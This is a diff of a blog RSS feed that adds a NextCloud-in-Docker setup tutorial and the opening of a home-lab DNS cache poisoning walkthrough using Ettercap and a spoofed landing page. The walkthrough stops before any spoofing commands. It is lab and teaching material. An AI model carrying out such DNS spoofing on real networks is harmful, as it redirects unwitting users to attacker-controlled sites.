@@ -1100,5 +1100,949 @@ I had this installed previously, but since I deleted the files, I need to remove
 </span></span></code></pre></div><p>Continue on with this methodology until you’ve installed all your missing dependencies. With these two steps combined, you should be able to restore your <code>/usr/include</code> file. This worked for me. Best of luck!</p>
 ]]></content:encoded>
     </item>
+    <item>
+      <title>How to Create and Deploy Your Own Cloud Server with NextCloud</title>
+      <link>http://localhost:1313/ally-petitt/en/posts/2023-04-09_how-to-create-and-deploy-your-own-cloud-server-with-nextcloud-345e185d602a/</link>
+      <pubDate>Sun, 09 Apr 2023 00:00:00 +0000</pubDate>
+      <guid>http://localhost:1313/ally-petitt/en/posts/2023-04-09_how-to-create-and-deploy-your-own-cloud-server-with-nextcloud-345e185d602a/</guid>
+      <description>&lt;h1 id=&#34;why-create-a-cloudserver&#34;&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://cdn-images-1.medium.com/max/800/0*-WVjY5h4EpphjjX7&#34; alt=&#34;&#34;  /&gt;
+
+Why Create a Cloud Server?&lt;/h1&gt;
+&lt;p&gt;As many security-conscious people are aware, saving something in the cloud really means saving it on somebody else’s computer. When using cloud services, you don’t own the data that you upload, nor do you own the program that you’re using. Additionally, it is within the cloud service provider’s rights to delete your data or remove your access to it if they had technical issues, went bankrupt, or you missed a bill. Not all of them will do that, but there is no law protecting the customer from something like this happening. There aren’t any measures in place to prevent the government or corporations from looking through your data and using it for their own objectives (in the US).&lt;/p&gt;
+&lt;p&gt;Aside from data security, creating your cloud server provides the opportunity to learn more about how cloud storage works, get practice with hosting a docker container and connecting to it on your LAN, and challenge yourself to do something new.&lt;/p&gt;
+&lt;h1 id=&#34;why-nextcloud&#34;&gt;Why NextCloud&lt;/h1&gt;
+&lt;p&gt;NextCloud is free and open source. They do not collect or share any of your data. For the paranoid, you can audit the &lt;a href=&#34;https://github.com/nextcloud&#34;&gt;source code&lt;/a&gt; yourself to verify this. The cost of a NextCloud server will be limited to the of the infrastructure that you’re using to host it.&lt;/p&gt;
+&lt;h1 id=&#34;my-setup&#34;&gt;My Setup&lt;/h1&gt;
+&lt;p&gt;In this demonstration, I’ll be hosting the NextCloud server in a Kali Linux virtual machine. Although I’m using Kali, you can do this on any operating system that allows you to download Docker. I’ll be accessing it through other devices on my LAN.&lt;/p&gt;
+&lt;h1 id=&#34;creating-your-docker-container&#34;&gt;Creating Your Docker Container&lt;/h1&gt;
+&lt;p&gt;To start, if you don’t already have docker installed, you can find the release for your operating system here: &lt;a href=&#34;https://docs.docker.com/desktop/release-notes/&#34;&gt;https://docs.docker.com/desktop/release-notes/&lt;/a&gt;&lt;/p&gt;
+&lt;h2 id=&#34;pull-and-run-the-nextcloud-container&#34;&gt;Pull and run the NextCloud container&lt;/h2&gt;
+&lt;p&gt;To find the versions of NextCloud that are available to you, visit their docker website: &lt;a href=&#34;https://hub.docker.com/_/nextcloud&#34;&gt;https://hub.docker.com/_/nextcloud&lt;/a&gt;.&lt;/p&gt;
+&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://cdn-images-1.medium.com/max/800/1*yVUBpaz7cPnubERvyi-o7w.png&#34; alt=&#34;&#34;  /&gt;
+
+In this example, I’ll be using version 24.0.11, but you can substitute with whichever version you’re using.&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-fallback&#34; data-lang=&#34;fallback&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;sudo docker pull nextcloud:24.0.11
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;The output of that command will look like this once it is completed:&lt;/p&gt;
+&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://cdn-images-1.medium.com/max/800/1*GN-cYnfs54AiOogx8-NAQw.png&#34; alt=&#34;&#34;  /&gt;
+
+Next, I’ll start the container and bind it to port 80 on my Kali VM.&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-fallback&#34; data-lang=&#34;fallback&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;sudo docker run --name my\_cloud -d -p 80:80 nextcloud:24.0.11 
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;&lt;strong&gt;Explanation:&lt;/strong&gt;&lt;/p&gt;
+&lt;ul&gt;
+&lt;li&gt;&lt;code&gt;--name&lt;/code&gt; will set the container name to be &lt;code&gt;my_cloud&lt;/code&gt;&lt;/li&gt;
+&lt;li&gt;&lt;code&gt;-d&lt;/code&gt; will run the container in detached mode. This means that the container will run in the background of my terminal instead of displaying all the output&lt;/li&gt;
+&lt;li&gt;&lt;code&gt;-p&lt;/code&gt; allows for port-binding from port 80 of the docker container to port 80 of the machine that the container is running on so that we can access it in the browser&lt;/li&gt;
+&lt;/ul&gt;
+&lt;p&gt;Now, visiting &lt;code&gt;&amp;lt;http://localhost:80&amp;gt;&lt;/code&gt; in the browser of my Kali VM leads to the NextCloud web interface.&lt;/p&gt;
+&lt;h1 id=&#34;setting-up-nextcloud-foruse&#34;&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://cdn-images-1.medium.com/max/800/1*09ClzbW6QlZFUKeE8VCFqw.png&#34; alt=&#34;&#34;  /&gt;
+
+Setting up NextCloud for use&lt;/h1&gt;
+&lt;h2 id=&#34;create-adminaccount&#34;&gt;Create Admin Account&lt;/h2&gt;
+&lt;p&gt;Like the initial homepage says, you can create an admin account by entering your desired credentials into the login form. Then click the install button below.&lt;/p&gt;
+&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://cdn-images-1.medium.com/max/800/1*NCg8BFzJsn7Q8DSYJc22gw.png&#34; alt=&#34;&#34;  /&gt;
+
+You will be prompted with a screen that optionally allows you to install reccomended apps.&lt;/p&gt;
+&lt;h2 id=&#34;create-useraccount&#34;&gt;Create User Account&lt;/h2&gt;
+&lt;p&gt;Each user of NextCloud will only be able to view their respective files. To create a user account, click on your profile picture and click &lt;code&gt;Users&lt;/code&gt;.&lt;/p&gt;
+&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://cdn-images-1.medium.com/max/800/1*rpUr6mASFndr9leQFgxjSw.png&#34; alt=&#34;&#34;  /&gt;
+
+Then, click the &lt;code&gt;New user&lt;/code&gt; button in the upper-righthand corner.&lt;/p&gt;
+&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://cdn-images-1.medium.com/max/800/1*XZ6nK22WFx20KFCEcIweNg.png&#34; alt=&#34;&#34;  /&gt;
+
+Fill in the form that appears with your desired information. and click &lt;code&gt;Add a new user&lt;/code&gt;. You can verify that the user was added by logging out of your administrator account and logging in with the user credentials.&lt;/p&gt;
+&lt;h2 id=&#34;whitelisting-domains&#34;&gt;Whitelisting Domains&lt;/h2&gt;
+&lt;p&gt;Now, we’ll need to configure the NextCloud server so that we can access it from other devices.&lt;/p&gt;
+&lt;p&gt;You’ll need to know your IP address. I use the &lt;code&gt;ifconfig&lt;/code&gt; command on my Kali VM to determine. Windows users can use &lt;code&gt;ipconfig&lt;/code&gt;.&lt;/p&gt;
+&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://cdn-images-1.medium.com/max/800/1*EPZQQ90fBx0es5jESHsJQg.png&#34; alt=&#34;&#34;  /&gt;
+
+I’ll install vim as a text editor so that I can edit the config files easier.&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-gdscript3&#34; data-lang=&#34;gdscript3&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;┌──&lt;/span&gt;(kali&lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;㉿&lt;/span&gt;kali)&lt;span style=&#34;color:#f92672&#34;&gt;-&lt;/span&gt;[&lt;span style=&#34;color:#f92672&#34;&gt;~&lt;/span&gt;]  
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;└─&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;$&lt;/span&gt; sudo docker exec &lt;span style=&#34;color:#f92672&#34;&gt;-&lt;/span&gt;it my\_cloud bash   
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;root&lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;@&lt;/span&gt;f6d476ccd902:&lt;span style=&#34;color:#f92672&#34;&gt;/&lt;/span&gt;&lt;span style=&#34;color:#66d9ef&#34;&gt;var&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;/&lt;/span&gt;www&lt;span style=&#34;color:#f92672&#34;&gt;/&lt;/span&gt;html&lt;span style=&#34;color:#75715e&#34;&gt;# apt update  &lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;--&lt;/span&gt; snip &lt;span style=&#34;color:#f92672&#34;&gt;--&lt;/span&gt;  
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;root&lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;@&lt;/span&gt;f6d476ccd902:&lt;span style=&#34;color:#f92672&#34;&gt;/&lt;/span&gt;&lt;span style=&#34;color:#66d9ef&#34;&gt;var&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;/&lt;/span&gt;www&lt;span style=&#34;color:#f92672&#34;&gt;/&lt;/span&gt;html&lt;span style=&#34;color:#75715e&#34;&gt;# apt install -y vim  &lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;--&lt;/span&gt; snip &lt;span style=&#34;color:#f92672&#34;&gt;--&lt;/span&gt;  
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;root&lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;@&lt;/span&gt;f6d476ccd902:&lt;span style=&#34;color:#f92672&#34;&gt;/&lt;/span&gt;&lt;span style=&#34;color:#66d9ef&#34;&gt;var&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;/&lt;/span&gt;www&lt;span style=&#34;color:#f92672&#34;&gt;/&lt;/span&gt;html&lt;span style=&#34;color:#75715e&#34;&gt;# vim config/config.php&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;In your &lt;code&gt;config/config.php&lt;/code&gt; file, add the option of &lt;code&gt;trusted_domains&lt;/code&gt; at the bottom, starting on line 21 (type &lt;code&gt;:set number&lt;/code&gt; in vim to show line numbers). This option will allow you to connect to the NextCloud server through different domain names. Without this option, you would not be able to use your server through a domain name besides localhost, which is not ideal if you’re trying to access it remotely.&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-fallback&#34; data-lang=&#34;fallback&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt; &amp;#39;trusted\_domains&amp;#39; =&amp;gt;  
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt; [  
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt; &amp;#39;localhost&amp;#39;,  
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt; &amp;#39;127.0.0.1&amp;#39;,  
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt; &amp;#39;&amp;lt;YOUR IP ADDRESS&amp;gt;&amp;#39;,  
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt; &amp;#39;&amp;lt;YOUR DOMAIN NAME (optional)&amp;gt;&amp;#39;,  
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt; ],
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://cdn-images-1.medium.com/max/800/1*RFzQIvqVYLkE7HLgJ2eciA.png&#34; alt=&#34;&#34;  /&gt;
+
+Now, I can use my NextCloud server from 192.168.1.53, 127.0.0.1, and localhost.&lt;/p&gt;
+&lt;p&gt;&lt;strong&gt;Note:&lt;/strong&gt; You can optionally choose to configure your own database. The documentation for doing that can be found &lt;a href=&#34;https://docs.nextcloud.com/server/latest/admin_manual/configuration_database/linux_database_configuration.html&#34;&gt;here&lt;/a&gt;.&lt;/p&gt;
+&lt;h1 id=&#34;connecting-from-otherdevices&#34;&gt;Connecting From Other Devices&lt;/h1&gt;
+&lt;h2 id=&#34;pc&#34;&gt;PC&lt;/h2&gt;
+&lt;p&gt;To connect from you PC, just type in the IP address of your NextCloud server into your browser and type in your login credentials.&lt;/p&gt;
+&lt;h2 id=&#34;mobile&#34;&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://cdn-images-1.medium.com/max/800/1*YSMzF6AAy_s1ddUyTn1fRA.png&#34; alt=&#34;&#34;  /&gt;
+
+Mobile&lt;/h2&gt;
+&lt;p&gt;You can also connect to the website from your phone. Alternatively, you can download the NextCloud app, available in the &lt;a href=&#34;https://apps.apple.com/us/app/nextcloud/id1125420102&#34;&gt;App Store&lt;/a&gt; and &lt;a href=&#34;https://apps.apple.com/us/app/nextcloud/id1125420102&#34;&gt;Google Play Store&lt;/a&gt;. Just type the same URL into the app that you would type in the browser.&lt;/p&gt;
+&lt;h1 id=&#34;conclusion&#34;&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://cdn-images-1.medium.com/max/800/0*rXIb7WPys_Tqgbh_&#34; alt=&#34;&#34;  /&gt;
+
+Conclusion&lt;/h1&gt;
+&lt;p&gt;NextCloud allows for a tremendous amount of flexibility. There are many configurations that you can set including brute force protection, antivirus scanning, OAuth2, and more as shown in &lt;a href=&#34;https://docs.nextcloud.com/server/latest/admin_manual/configuration_server/index.html&#34;&gt;their documentation&lt;/a&gt;. I hope that you got value out of this article and were inspired to take control of your data.&lt;/p&gt;
+</description>
+      <content:encoded><![CDATA[<h1 id="why-create-a-cloudserver"><img loading="lazy" src="https://cdn-images-1.medium.com/max/800/0*-WVjY5h4EpphjjX7" alt=""  />
+
+Why Create a Cloud Server?</h1>
+<p>As many security-conscious people are aware, saving something in the cloud really means saving it on somebody else’s computer. When using cloud services, you don’t own the data that you upload, nor do you own the program that you’re using. Additionally, it is within the cloud service provider’s rights to delete your data or remove your access to it if they had technical issues, went bankrupt, or you missed a bill. Not all of them will do that, but there is no law protecting the customer from something like this happening. There aren’t any measures in place to prevent the government or corporations from looking through your data and using it for their own objectives (in the US).</p>
+<p>Aside from data security, creating your cloud server provides the opportunity to learn more about how cloud storage works, get practice with hosting a docker container and connecting to it on your LAN, and challenge yourself to do something new.</p>
+<h1 id="why-nextcloud">Why NextCloud</h1>
+<p>NextCloud is free and open source. They do not collect or share any of your data. For the paranoid, you can audit the <a href="https://github.com/nextcloud">source code</a> yourself to verify this. The cost of a NextCloud server will be limited to the of the infrastructure that you’re using to host it.</p>
+<h1 id="my-setup">My Setup</h1>
+<p>In this demonstration, I’ll be hosting the NextCloud server in a Kali Linux virtual machine. Although I’m using Kali, you can do this on any operating system that allows you to download Docker. I’ll be accessing it through other devices on my LAN.</p>
+<h1 id="creating-your-docker-container">Creating Your Docker Container</h1>
+<p>To start, if you don’t already have docker installed, you can find the release for your operating system here: <a href="https://docs.docker.com/desktop/release-notes/">https://docs.docker.com/desktop/release-notes/</a></p>
+<h2 id="pull-and-run-the-nextcloud-container">Pull and run the NextCloud container</h2>
+<p>To find the versions of NextCloud that are available to you, visit their docker website: <a href="https://hub.docker.com/_/nextcloud">https://hub.docker.com/_/nextcloud</a>.</p>
+<p><img loading="lazy" src="https://cdn-images-1.medium.com/max/800/1*yVUBpaz7cPnubERvyi-o7w.png" alt=""  />
+
+In this example, I’ll be using version 24.0.11, but you can substitute with whichever version you’re using.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-fallback" data-lang="fallback"><span style="display:flex;"><span>sudo docker pull nextcloud:24.0.11
+</span></span></code></pre></div><p>The output of that command will look like this once it is completed:</p>
+<p><img loading="lazy" src="https://cdn-images-1.medium.com/max/800/1*GN-cYnfs54AiOogx8-NAQw.png" alt=""  />
+
+Next, I’ll start the container and bind it to port 80 on my Kali VM.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-fallback" data-lang="fallback"><span style="display:flex;"><span>sudo docker run --name my\_cloud -d -p 80:80 nextcloud:24.0.11 
+</span></span></code></pre></div><p><strong>Explanation:</strong></p>
+<ul>
+<li><code>--name</code> will set the container name to be <code>my_cloud</code></li>
+<li><code>-d</code> will run the container in detached mode. This means that the container will run in the background of my terminal instead of displaying all the output</li>
+<li><code>-p</code> allows for port-binding from port 80 of the docker container to port 80 of the machine that the container is running on so that we can access it in the browser</li>
+</ul>
+<p>Now, visiting <code>&lt;http://localhost:80&gt;</code> in the browser of my Kali VM leads to the NextCloud web interface.</p>
+<h1 id="setting-up-nextcloud-foruse"><img loading="lazy" src="https://cdn-images-1.medium.com/max/800/1*09ClzbW6QlZFUKeE8VCFqw.png" alt=""  />
+
+Setting up NextCloud for use</h1>
+<h2 id="create-adminaccount">Create Admin Account</h2>
+<p>Like the initial homepage says, you can create an admin account by entering your desired credentials into the login form. Then click the install button below.</p>
+<p><img loading="lazy" src="https://cdn-images-1.medium.com/max/800/1*NCg8BFzJsn7Q8DSYJc22gw.png" alt=""  />
+
+You will be prompted with a screen that optionally allows you to install reccomended apps.</p>
+<h2 id="create-useraccount">Create User Account</h2>
+<p>Each user of NextCloud will only be able to view their respective files. To create a user account, click on your profile picture and click <code>Users</code>.</p>
+<p><img loading="lazy" src="https://cdn-images-1.medium.com/max/800/1*rpUr6mASFndr9leQFgxjSw.png" alt=""  />
+
+Then, click the <code>New user</code> button in the upper-righthand corner.</p>
+<p><img loading="lazy" src="https://cdn-images-1.medium.com/max/800/1*XZ6nK22WFx20KFCEcIweNg.png" alt=""  />
+
+Fill in the form that appears with your desired information. and click <code>Add a new user</code>. You can verify that the user was added by logging out of your administrator account and logging in with the user credentials.</p>
+<h2 id="whitelisting-domains">Whitelisting Domains</h2>
+<p>Now, we’ll need to configure the NextCloud server so that we can access it from other devices.</p>
+<p>You’ll need to know your IP address. I use the <code>ifconfig</code> command on my Kali VM to determine. Windows users can use <code>ipconfig</code>.</p>
+<p><img loading="lazy" src="https://cdn-images-1.medium.com/max/800/1*EPZQQ90fBx0es5jESHsJQg.png" alt=""  />
+
+I’ll install vim as a text editor so that I can edit the config files easier.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-gdscript3" data-lang="gdscript3"><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">┌──</span>(kali<span style="color:#960050;background-color:#1e0010">㉿</span>kali)<span style="color:#f92672">-</span>[<span style="color:#f92672">~</span>]  
+</span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">└─</span><span style="color:#f92672">$</span> sudo docker exec <span style="color:#f92672">-</span>it my\_cloud bash   
+</span></span><span style="display:flex;"><span>root<span style="color:#960050;background-color:#1e0010">@</span>f6d476ccd902:<span style="color:#f92672">/</span><span style="color:#66d9ef">var</span><span style="color:#f92672">/</span>www<span style="color:#f92672">/</span>html<span style="color:#75715e"># apt update  </span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">--</span> snip <span style="color:#f92672">--</span>  
+</span></span><span style="display:flex;"><span>root<span style="color:#960050;background-color:#1e0010">@</span>f6d476ccd902:<span style="color:#f92672">/</span><span style="color:#66d9ef">var</span><span style="color:#f92672">/</span>www<span style="color:#f92672">/</span>html<span style="color:#75715e"># apt install -y vim  </span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">--</span> snip <span style="color:#f92672">--</span>  
+</span></span><span style="display:flex;"><span>root<span style="color:#960050;background-color:#1e0010">@</span>f6d476ccd902:<span style="color:#f92672">/</span><span style="color:#66d9ef">var</span><span style="color:#f92672">/</span>www<span style="color:#f92672">/</span>html<span style="color:#75715e"># vim config/config.php</span>
+</span></span></code></pre></div><p>In your <code>config/config.php</code> file, add the option of <code>trusted_domains</code> at the bottom, starting on line 21 (type <code>:set number</code> in vim to show line numbers). This option will allow you to connect to the NextCloud server through different domain names. Without this option, you would not be able to use your server through a domain name besides localhost, which is not ideal if you’re trying to access it remotely.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-fallback" data-lang="fallback"><span style="display:flex;"><span> &#39;trusted\_domains&#39; =&gt;  
+</span></span><span style="display:flex;"><span> [  
+</span></span><span style="display:flex;"><span> &#39;localhost&#39;,  
+</span></span><span style="display:flex;"><span> &#39;127.0.0.1&#39;,  
+</span></span><span style="display:flex;"><span> &#39;&lt;YOUR IP ADDRESS&gt;&#39;,  
+</span></span><span style="display:flex;"><span> &#39;&lt;YOUR DOMAIN NAME (optional)&gt;&#39;,  
+</span></span><span style="display:flex;"><span> ],
+</span></span></code></pre></div><p><img loading="lazy" src="https://cdn-images-1.medium.com/max/800/1*RFzQIvqVYLkE7HLgJ2eciA.png" alt=""  />
+
+Now, I can use my NextCloud server from 192.168.1.53, 127.0.0.1, and localhost.</p>
+<p><strong>Note:</strong> You can optionally choose to configure your own database. The documentation for doing that can be found <a href="https://docs.nextcloud.com/server/latest/admin_manual/configuration_database/linux_database_configuration.html">here</a>.</p>
+<h1 id="connecting-from-otherdevices">Connecting From Other Devices</h1>
+<h2 id="pc">PC</h2>
+<p>To connect from you PC, just type in the IP address of your NextCloud server into your browser and type in your login credentials.</p>
+<h2 id="mobile"><img loading="lazy" src="https://cdn-images-1.medium.com/max/800/1*YSMzF6AAy_s1ddUyTn1fRA.png" alt=""  />
+
+Mobile</h2>
+<p>You can also connect to the website from your phone. Alternatively, you can download the NextCloud app, available in the <a href="https://apps.apple.com/us/app/nextcloud/id1125420102">App Store</a> and <a href="https://apps.apple.com/us/app/nextcloud/id1125420102">Google Play Store</a>. Just type the same URL into the app that you would type in the browser.</p>
+<h1 id="conclusion"><img loading="lazy" src="https://cdn-images-1.medium.com/max/800/0*rXIb7WPys_Tqgbh_" alt=""  />
+
+Conclusion</h1>
+<p>NextCloud allows for a tremendous amount of flexibility. There are many configurations that you can set including brute force protection, antivirus scanning, OAuth2, and more as shown in <a href="https://docs.nextcloud.com/server/latest/admin_manual/configuration_server/index.html">their documentation</a>. I hope that you got value out of this article and were inspired to take control of your data.</p>
+]]></content:encoded>
+    </item>
+    <item>
+      <title>Practical Demonstration: DNS Spoofing &#43; Home Lab</title>
+      <link>http://localhost:1313/ally-petitt/en/posts/2023-03-28_practical-demonstration--dns-spoofing---home-lab-f7294443fb23/</link>
+      <pubDate>Tue, 28 Mar 2023 00:00:00 +0000</pubDate>
+      <guid>http://localhost:1313/ally-petitt/en/posts/2023-03-28_practical-demonstration--dns-spoofing---home-lab-f7294443fb23/</guid>
+      <description>&lt;h2 id=&#34;dns-cache-poisoning-on-home-lab-walkthrough&#34;&gt;DNS Cache Poisoning on Home Lab Walkthrough&lt;/h2&gt;
+&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://cdn-images-1.medium.com/max/800/0*P3ZahJWqz8AFbk9s.png&#34; alt=&#34;Basic DNS cache poisoning attack&#34;  /&gt;
+
+&lt;em&gt;&lt;a href=&#34;https://www.okta.com/sites/default/files/media/image/2021-04/DNSPoisoning.png&#34;&gt;https://www.okta.com/sites/default/files/media/image/2021-04/DNSPoisoning.png&lt;/a&gt;&lt;/em&gt;&lt;/p&gt;
+&lt;h1 id=&#34;overview&#34;&gt;Overview&lt;/h1&gt;
+&lt;p&gt;In this article, I will be walking you through a common method of implementing DNS cache poisoning on a network. I’ll illustrate my process with screenshots, commands, and explanations. You are welcome to follow along and gain hands-on experience with DNS spoofing to further reinforce the knowledge that you already have.&lt;/p&gt;
+&lt;h2 id=&#34;intended-audience&#34;&gt;Intended Audience&lt;/h2&gt;
+&lt;p&gt;This is intended for a more technical audience. If you’re a beginner, I recommend looking for a more comprehensive tutorial to walk you through all the terminology and commands. For the purposes of this article, I’m assuming that you already have a foundational understanding of Linux, DNS, virtual machines, and potentially troubleshooting. I will not be explaining how DNS cache poisoning works. For more information, you may read the articles linked in the “More Reading” section at the end of this post.&lt;/p&gt;
+&lt;h2 id=&#34;tools-used&#34;&gt;Tools Used&lt;/h2&gt;
+&lt;ul&gt;
+&lt;li&gt;Windows VM&lt;/li&gt;
+&lt;li&gt;Kali VM&lt;/li&gt;
+&lt;li&gt;Ettercap&lt;/li&gt;
+&lt;li&gt;Text editor&lt;/li&gt;
+&lt;/ul&gt;
+&lt;p&gt;You will also need root/system privileges or sudo abilities on the attacking machine.&lt;/p&gt;
+&lt;h1 id=&#34;practical-demonstration&#34;&gt;Practical Demonstration&lt;/h1&gt;
+&lt;ol&gt;
+&lt;li&gt;Find the IP address of your attacker machine&lt;/li&gt;
+&lt;/ol&gt;
+&lt;hr&gt;
+&lt;p&gt;Since I’m doing this on my LAN, I can use my private IPv4 address, which I truncated from the &lt;code&gt;ifconfig&lt;/code&gt; command for the purpose of this demonstration.&lt;/p&gt;
+&lt;h2 id=&#34;2-create-the-landing-page-of-your-malicious-website&#34;&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://cdn-images-1.medium.com/max/800/1*UY_WaZN3PluXBghyE4c0nA.png&#34; alt=&#34;&#34;  /&gt;
+
+2. Create the landing page of your malicious website&lt;/h2&gt;
+&lt;p&gt;Now, we’ll prepare the HTML file that the victim will encounter once the DNS has been spoofed. Since I’m using an Apache webserver, I’ll place the file in the root directory on my machine, which is &lt;code&gt;/var/www/html&lt;/code&gt;. This is my file:&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-gdscript3&#34; data-lang=&#34;gdscript3&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;┌──&lt;/span&gt;(ally&lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;㉿&lt;/span&gt;kali)&lt;span style=&#34;color:#f92672&#34;&gt;-&lt;/span&gt;[&lt;span style=&#34;color:#f92672&#34;&gt;/&lt;/span&gt;&lt;span style=&#34;color:#66d9ef&#34;&gt;var&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;/&lt;/span&gt;www&lt;span style=&#34;color:#f92672&#34;&gt;/&lt;/span&gt;html]  
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;└─&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;$&lt;/span&gt; cat index&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;html   
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;&amp;lt;&lt;/span&gt;title&lt;span style=&#34;color:#f92672&#34;&gt;&amp;gt;&lt;/span&gt;No More Planting Trees&lt;span style=&#34;color:#f92672&#34;&gt;&amp;lt;/&lt;/span&gt;title&lt;span style=&#34;color:#f92672&#34;&gt;&amp;gt;&lt;/span&gt;  
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;  
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;&amp;lt;&lt;/span&gt;h1&lt;span style=&#34;color:#f92672&#34;&gt;&amp;gt;&lt;/span&gt;No More Planting Trees&lt;span style=&#34;color:#f92672&#34;&gt;&amp;lt;/&lt;/span&gt;h1&lt;span style=&#34;color:#f92672&#34;&gt;&amp;gt;&lt;/span&gt;  
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;  
